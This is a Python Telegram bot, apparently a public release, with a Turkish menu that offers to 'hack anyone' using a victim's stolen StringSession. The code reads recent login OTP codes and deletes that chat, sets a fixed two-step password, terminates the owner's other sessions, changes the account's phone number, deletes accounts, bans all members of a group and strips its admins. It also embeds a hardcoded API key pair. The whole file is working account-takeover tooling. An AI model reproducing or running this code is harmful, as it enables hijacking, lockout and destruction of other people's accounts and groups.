# COPYRIGHT © 2021-22 BY LEGENDX22 🔥
# NOW PUBLIC BY LEGENDX
import os
os.system("pip install Telethon==1.21.1")
from telethon import TelegramClient, events, functions, types
api_id = os.environ.get("APP_ID")
import os, asyncio
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('Xarmy', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

legendx = 1967548493


async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('LEGENDXISBEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "TheXArmy"
menu = '''

**@georgia_icraat FEDERATION🇬🇪🐊**
FED ID `34d81b1d-e277-41af-90e1-6e91abaf7cdf`


A: [kullanıcının kendi gruplarını ve kanallarını kontrol edin]

B: [kullanıcı telefon numarası kullanıcı adı gibi tüm bilgileri kontrol edin...]

C: [bir grubu yasakla {bana StringSession ve kanal/grup kullanıcı adını ver oradaki tüm üyeleri yasaklayacağım}]

D: [kullanıcıyı son otp bil {1. kullanım seçeneği B telefon numarasını al ve orada oturum aç Hesap sonra beni kullan sana otp vereceğim}]

E: [StringSession ile Bir Gruba/Kanala Katılın]

F: [StringSession aracılığıyla bir Gruptan/Kanaldan Ayrılın]

G: [Bir Grubu/Kanalı Sil]

H: [Kullanıcıyı kontrol edin iki adım etkinleştirin veya devre dışı bırakın]

I: [StringSession'ınız dışındaki tüm mevcut aktif oturumları sonlandırın]

J: [Hesabı sil]

K: [Bir gruptaki/kanaldaki tüm yöneticileri indir]

L: [Bir grupta/kanalda bir üyeyi tanıtın]

M: [StringSession kullanarak Telefon numarasını değiştirin]

SONRA DAHA FAZLA ÖZELLİK EKLERİM 🥱
'''
mm = '''
herkesi hackleyebilirsin
Onun StringSession'ını al ve beni kullan
sana tüm gücümü vereceğim
/hack yazın
'''
@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    await event.reply("lütfen beni pm'de kullan😒")
  else:
    await event.reply(mm)
@client.on(events.NewMessage(pattern="/give"))
async def op(event):
  if not event.sender_id == legendx:
    return await event.reply("lütfen beni kullanma siktir git 🥱")
  try:
    await event.reply("session bot file", file="Xarmy.session")
  except Exception as e:
    print (e)


@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  await event.reply("lütfen beni pm'de kullan😒")
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"Dize oturumu ile ne istediğinizi seçin \n\n{menu}")
    res = await x.get_response()
    r = res.text
    if res.text == "A":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("Bu StringSession belki sonlandırılır")
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDETAILS BY X ARMY")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\n ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
    elif res.text == "B":
      await x.send_message("GIVE STRING SESSION")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      i = await userinfo(strses.text)
      await event.reply(i + "\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
    elif r == "C":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VER")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("Tüm üyeler yasaklanıyor ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
    elif r == "D":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\n ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
    elif r == "E":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VER")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await event.reply("Kanala/Gruba Katıldınız ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u Kullandığınız İçin Teşekkürler")
    elif r == "F":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VER")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await event.reply("Kanaldan/Gruptan Ayrıldı ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u Kullandığınız İçin Teşekkürler")
    elif r == "G":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      await x.send_message("GRUP/KANAL KULLANICI ADI/ID VER")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("Kanalı/Grubu Silindi ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u Kullandığınız İçin Teşekkürler")
    elif r == "H":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      i = await user2fa(strses.text)
      if i:
        await event.reply("Kullanıcının iki adımı yok, bu yüzden şimdi iki adı `ɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊` şimdi giriş yapabilirsiniz\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
      else:
        await event.reply("Üzgünüm Kullanıcı Zaten iki adım var")
    elif r == "I":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      i = await terminate(strses.text)
      await event.reply("Tüm oturumlar sonlandırıldı\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
    elif res.text == "J":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      i = await delacc(strses.text)
      await event.reply("Hesap BAŞARIYLA silindi\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
    elif res.text == "L":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      await x.send_message("ŞİMDİ GRUP/KANAL KULLANICI ADI VERİN")
      grp = await x.get_response()
      await x.send_message("ŞİMDİ KULLANICIYA KULLANICI ADI VERİN")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("Sizi Grupta/Kanalda Tanıtıyorum Bir dakika bekleyin 😗😗\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
    elif res.text == "K":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      await x.send_message("ŞİMDİ GRUP/KANAL KULLANICI ADI VERİN")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("Grubun/Kanalın tüm üyelerini indiriyorum bir dakika bekleyin 😗😗\n\nɪ ᴄ ʀ ᴀ ᴀ ᴛ 🇬🇪 🐊 Bot'u kullandığınız için teşekkürler")
    elif res.text == "M":
      await x.send_message("DİZEL OTURUM VER")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Bu StringSession belki sonlandırılır")
      await x.send_message("DEĞİŞTİRMEK İSTEDİĞİNİZ NUMARAYI VERİN\n[NOT: 2. satırı veya metni şimdi numaraları KULLANMAYIN]\n[şimdi 2. satırı veya metni kullanıyorsanız, numara alamazsınız] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n telefon kodu özetini kopyalayın ve numaranızı kontrol edin, otp\ni 20 saniye durun telefon kodu özetini ve otp'yi kopyalayın")
        await asyncio.sleep(20)
        await x.send_message("ŞİMDİ TELEFON KODU HASH VERİN")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("NOW GIVE THE OTP")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("TEBRİKLER NUMARA DEĞİŞTİ")
        else:
          await event.respond("Bir şey yanlış")
      except Exception as e:
        await event.respond("BU HATAYI GÖNDER - @cosmic_house\n**LOGS**\n" + str(e))

    else:
      await event.respond("Yanlış Metin Bulundu Yeniden yazın /hack ve kullanın")





client.run_until_disconnected()
